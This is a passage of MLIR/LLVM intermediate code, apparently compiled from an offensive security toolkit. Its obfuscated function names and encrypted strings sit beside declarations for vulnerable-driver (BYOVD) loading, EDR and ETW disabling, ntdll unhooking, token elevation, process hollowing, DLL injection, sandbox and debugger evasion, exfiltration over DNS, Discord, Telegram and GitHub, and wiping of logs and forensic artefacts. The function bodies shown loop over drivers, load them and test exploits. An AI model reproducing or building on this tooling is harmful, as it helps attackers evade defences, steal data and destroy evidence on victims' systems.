  llvm.mlir.global external @g_3cddc28a() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_9f9def0f() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_7bfb2ead() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @g_743afcdf() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @MAX_INFERENCE_TIME_MS(100 : i32) {addr_space = 0 : i32} : i32
  llvm.mlir.global external @audit_log_initialized(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @threat_score(0.000000e+00 : f64) {addr_space = 0 : i32} : f64
  llvm.mlir.global external @g_e47349ba() {addr_space = 0 : i32} : !llvm.array<0 x ptr> {
    %0 = llvm.mlir.undef : !llvm.array<0 x ptr>
    llvm.return %0 : !llvm.array<0 x ptr>
  }
  llvm.mlir.global external @ai_engine_ready(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @operations_count(0 : i32) {addr_space = 0 : i32} : i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string_from_i64(i64) -> !llvm.ptr
  llvm.func @string_from_f64(f64) -> !llvm.ptr
  llvm.func @string_from_bool(i1) -> !llvm.ptr
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @byovd_load_driver(!llvm.ptr) -> i64
  llvm.func @byovd_test_exploit(i64) -> i32
  llvm.func @btr_disable_notifications()
  llvm.func @btr_mask_module(!llvm.ptr)
  llvm.func @ai_init()
  llvm.func @ai_collect_telemetry()
  llvm.func @ai_score_threat() -> f64
  llvm.func @plugin_load(!llvm.ptr) -> i64
  llvm.func @plugin_run(i64, !llvm.ptr)
  llvm.func @edrhoker_detect()
  llvm.func @blindside_unhook_ntdll()
  llvm.func @jocky_exploit_disable_callbacks()
  llvm.func @jocky_exploit_token_replacement(i32, i32)
  llvm.func @jocky_registry_create_key(i64, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32)
  llvm.func @jocky_registry_close_key(!llvm.ptr)
  llvm.func @audit_init(i32)
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_export(!llvm.ptr)
  llvm.func @audit_verify() -> i32
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i64
  llvm.func @sandbox_set_limits(i64, i64, i64, i64)
  llvm.func @sandbox_monitor(i64) -> i32
  llvm.func @sandbox_wait(i64)
  llvm.func @sandbox_export_trace(i64, !llvm.ptr)
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @forensics_wipe_powershell_history()
  llvm.func @forensics_wipe_cmd_history()
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr)
  llvm.func @forensics_flush_arp_cache()
  llvm.func @forensics_clear_dns_cache()
  llvm.func @jocky_cleanup_usn_journal()
  llvm.func @linux_forensics_wipe_bash_history()
  llvm.func @jocky_linux_cleanup_syslog()
  llvm.func @jocky_linux_cleanup_journal()
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_get_syscall_number(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_kread(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_kwrite(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_module_stomp(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_thread_hijack(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @f_0218a827(%arg0: !llvm.ptr, %arg1: !llvm.ptr, %arg2: !llvm.ptr, %arg3: !llvm.ptr) {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @operations_count : !llvm.ptr
    %2 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg0, %2 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %3 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg1, %3 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %4 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg2, %4 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %5 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg3, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %6 = llvm.load %2 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %7 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %8 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %9 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.call @audit_log(%6, %7, %8, %9) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %10 = llvm.load %1 {alignment = 4 : i64} : !llvm.ptr -> i32
    %11 = llvm.add %10, %0 : i32
    llvm.store %11, %1 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.return
  }
  llvm.func @f_f8b7e158() {
    %0 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.5.enc" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %8 = llvm.mlir.constant(1000 : i32) : i32
    %9 = llvm.mlir.constant(true) : i1
    %10 = llvm.mlir.addressof @audit_log_initialized : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.7.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.9.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.11.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.12.enc" : !llvm.ptr
    %17 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    %18 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %3[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.getelementptr %4[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%20) : (!llvm.ptr) -> ()
    %21 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    %23 = llvm.getelementptr %7[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.mlir.addressof @audit_init : !llvm.ptr
    %25 = llvm.call %24(%8) : !llvm.ptr, (i32) -> i1
    llvm.store %9, %10 {alignment = 1 : i64} : i1, !llvm.ptr
    %26 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %27 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %28 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %29 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    llvm.call @f_0218a827(%26, %27, %28, %29) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %30 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    llvm.call @println(%30) : (!llvm.ptr) -> ()
    %31 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_b9127cd9() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.14.enc" : !llvm.ptr
    %4 = llvm.mlir.addressof @g_fa0366c2 : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %6 = llvm.mlir.constant(0 : i64) : i64
    %7 = llvm.mlir.constant(2 : i32) : i32
    %8 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.22.enc" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.30.enc" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.20.enc" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.26.enc" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    %21 = llvm.mlir.constant(1 : i64) : i64
    %22 = llvm.mlir.addressof @".str.21.enc" : !llvm.ptr
    %23 = llvm.mlir.addressof @g_e47349ba : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
    %26 = llvm.mlir.addressof @".str.33.enc" : !llvm.ptr
    %27 = llvm.mlir.addressof @".str.31.enc" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.32.enc" : !llvm.ptr
    %29 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %30 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %31 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %32 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %33 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %34 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %36 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %37 = llvm.call @array_len(%36) : (!llvm.ptr) -> i64
    %38 = llvm.call @string(%37) : (i64) -> !llvm.ptr
    %39 = llvm.call @jocky_str_concat(%35, %38) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    %40 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    %41 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %41 {alignment = 4 : i64} : i32, !llvm.ptr
    %42 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %43 = llvm.call @array_len(%42) : (!llvm.ptr) -> i64
    %44 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %6, %44 {alignment = 4 : i64} : i64, !llvm.ptr
    %45 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb9
    %46 = llvm.load %44 {alignment = 4 : i64} : !llvm.ptr -> i64
    %47 = llvm.icmp "slt" %46, %43 : i64
    llvm.cond_br %47, ^bb2, ^bb10
  ^bb2:  // pred: ^bb1
    %48 = llvm.bitcast %42 : !llvm.ptr to !llvm.ptr
    %49 = llvm.getelementptr %48[%46] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %50 = llvm.load %49 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %50, %45 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %51 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %52 = llvm.bitcast %51 : !llvm.ptr to !llvm.ptr
    %53 = llvm.getelementptr %52[%2] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %54 = llvm.load %53 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %54, %29 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %55 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %56 = llvm.bitcast %55 : !llvm.ptr to !llvm.ptr
    %57 = llvm.getelementptr %56[%0] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %58 = llvm.load %57 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %58, %30 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %59 = llvm.load %45 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %60 = llvm.bitcast %59 : !llvm.ptr to !llvm.ptr
    %61 = llvm.getelementptr %60[%7] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %62 = llvm.load %61 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %62, %31 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %63 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<4 x i8>
    %64 = llvm.load %41 {alignment = 4 : i64} : !llvm.ptr -> i32
    %65 = llvm.add %64, %0 : i32
    %66 = llvm.sext %65 : i32 to i64
    %67 = llvm.call @string(%66) : (i64) -> !llvm.ptr
    %68 = llvm.call @jocky_str_concat(%63, %67) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %69 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x i8>
    %70 = llvm.call @jocky_str_concat(%68, %69) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %71 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %72 = llvm.call @array_len(%71) : (!llvm.ptr) -> i64
    %73 = llvm.call @string(%72) : (i64) -> !llvm.ptr
    %74 = llvm.call @jocky_str_concat(%70, %73) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %75 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<3 x i8>
    %76 = llvm.call @jocky_str_concat(%74, %75) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %77 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %78 = llvm.call @jocky_str_concat(%76, %77) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%78) : (!llvm.ptr) -> ()
    %79 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %80 = llvm.mlir.addressof @byovd_load_driver : !llvm.ptr
    %81 = llvm.call %80(%79) : !llvm.ptr, (!llvm.ptr) -> i32
    llvm.store %81, %32 {alignment = 4 : i64} : i32, !llvm.ptr
    %82 = llvm.load %32 {alignment = 4 : i64} : !llvm.ptr -> i32
    %83 = llvm.icmp "sgt" %82, %2 : i32
    llvm.cond_br %83, ^bb3, ^bb7
  ^bb3:  // pred: ^bb2
    %84 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
    %85 = llvm.load %32 {alignment = 4 : i64} : !llvm.ptr -> i32
    %86 = llvm.sext %85 : i32 to i64
    %87 = llvm.call @string(%86) : (i64) -> !llvm.ptr
    %88 = llvm.call @jocky_str_concat(%84, %87) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%88) : (!llvm.ptr) -> ()
    %89 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %90 = llvm.load %30 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %91 = llvm.call @jocky_str_concat(%89, %90) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%91) : (!llvm.ptr) -> ()
    %92 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %93 = llvm.load %31 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %94 = llvm.ptrtoint %93 : !llvm.ptr to i64
    %95 = llvm.call @string(%94) : (i64) -> !llvm.ptr
    %96 = llvm.call @jocky_str_concat(%92, %95) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%96) : (!llvm.ptr) -> ()
    %97 = llvm.load %32 {alignment = 4 : i64} : !llvm.ptr -> i32
    %98 = llvm.mlir.addressof @byovd_test_exploit : !llvm.ptr
    %99 = llvm.call %98(%97) : !llvm.ptr, (i32) -> i32
    llvm.store %99, %33 {alignment = 4 : i64} : i32, !llvm.ptr
    %100 = llvm.load %33 {alignment = 4 : i64} : !llvm.ptr -> i32
    %101 = llvm.icmp "eq" %100, %2 : i32
    llvm.cond_br %101, ^bb4, ^bb5
  ^bb4:  // pred: ^bb3
    %102 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<52 x i8>
    llvm.call @println(%102) : (!llvm.ptr) -> ()
    %103 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %104 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %105 = llvm.call @array_append(%103, %104) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %105, %23 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %106 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %107 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %108 = llvm.load %30 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %109 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    llvm.call @f_0218a827(%106, %107, %108, %109) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %110 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%110) : (!llvm.ptr) -> ()
    %111 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    %112 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %113 = llvm.call @jocky_str_concat(%111, %112) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%113) : (!llvm.ptr) -> ()
    llvm.br ^bb10
  ^bb5:  // pred: ^bb3
    %114 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<50 x i8>
    llvm.call @println(%114) : (!llvm.ptr) -> ()
    %115 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %116 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %117 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %118 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%115, %116, %117, %118) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // pred: ^bb5
    llvm.br ^bb8
  ^bb7:  // pred: ^bb2
    %119 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%119) : (!llvm.ptr) -> ()
    %120 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %121 = llvm.load %29 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %122 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %123 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @f_0218a827(%120, %121, %122, %123) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %124 = llvm.load %41 {alignment = 4 : i64} : !llvm.ptr -> i32
    %125 = llvm.add %124, %0 : i32
    llvm.store %125, %41 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb9
  ^bb9:  // pred: ^bb8
    %126 = llvm.add %46, %21 : i64
    llvm.store %126, %44 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb10:  // 2 preds: ^bb1, ^bb4
    %127 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %128 = llvm.call @array_len(%127) : (!llvm.ptr) -> i64
    %129 = llvm.sext %2 : i32 to i64
    %130 = llvm.icmp "sgt" %128, %129 : i64
    llvm.cond_br %130, ^bb11, ^bb12
  ^bb11:  // pred: ^bb10
    %131 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%131) : (!llvm.ptr) -> ()
    %132 = llvm.getelementptr %27[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %133 = llvm.load %23 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %134 = llvm.call @array_len(%133) : (!llvm.ptr) -> i64
    %135 = llvm.call @string(%134) : (i64) -> !llvm.ptr
    %136 = llvm.call @jocky_str_concat(%132, %135) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %137 = llvm.getelementptr %28[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %138 = llvm.call @jocky_str_concat(%136, %137) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%138) : (!llvm.ptr) -> ()
    llvm.br ^bb13
  ^bb12:  // pred: ^bb10
    %139 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%139) : (!llvm.ptr) -> ()
    %140 = llvm.getelementptr %26[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<58 x i8>
    llvm.call @println(%140) : (!llvm.ptr) -> ()
    llvm.br ^bb13
  ^bb13:  // 2 preds: ^bb11, ^bb12
    %141 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%141) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @f_b610cf36() {
    %0 = llvm.mlir.addressof @".str.34.enc" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.35.enc" : !llvm.ptr
    %3 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.36.enc" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.37.enc" : !llvm.ptr
